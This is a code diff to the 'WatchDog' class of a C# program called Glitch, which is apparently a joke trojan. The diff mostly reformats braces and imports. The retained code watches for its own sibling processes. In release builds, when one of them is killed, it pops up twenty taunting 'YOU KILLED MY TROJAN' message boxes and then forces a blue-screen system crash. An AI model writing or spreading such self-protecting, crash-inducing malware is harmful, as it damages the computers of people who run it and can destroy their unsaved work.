@@ -3,15 +3,14 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Threading;
-using System.Windows.Forms;
 using CC_Functions.W32;
-using GlitchPayloads;
 
 namespace Glitch
 {
     public static class WatchDog
     {
         public const int WDC = 5;
+
         public static readonly string KillMessages = @"YOU KILLED MY TROJAN!\nNow you are going to die.
 REST IN PISS, FOREVER MISS.
 I WARNED YOU...
@@ -48,15 +47,11 @@ Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!
             Thread.Sleep(5000);
             string modN = Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.ModuleName);
             while (true)
-            {
                 if (Process.GetProcessesByName(modN).Length != WDC + 1)
                 {
 #if DEBUG
                     Process[] p = Process.GetProcessesByName(modN);
-                    for (int i = 0; i < p.Length; i++)
-                    {
-                        p[i].Kill();
-                    }
+                    for (int i = 0; i < p.Length; i++) p[i].Kill();
 #else
                     for (int i = 0; i < 20; i++)
                             System.Threading.Tasks.Task.Run(() => { MessageBox.Show(KillMessagesArr[Common.Rnd.Next(0, KillMessagesArr.Length)]); });
@@ -64,7 +59,6 @@ Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!
                     Power.RaiseEvent(Power.ShutdownMode.BSoD);
 #endif
                 }
-            }
         }
     }
 }
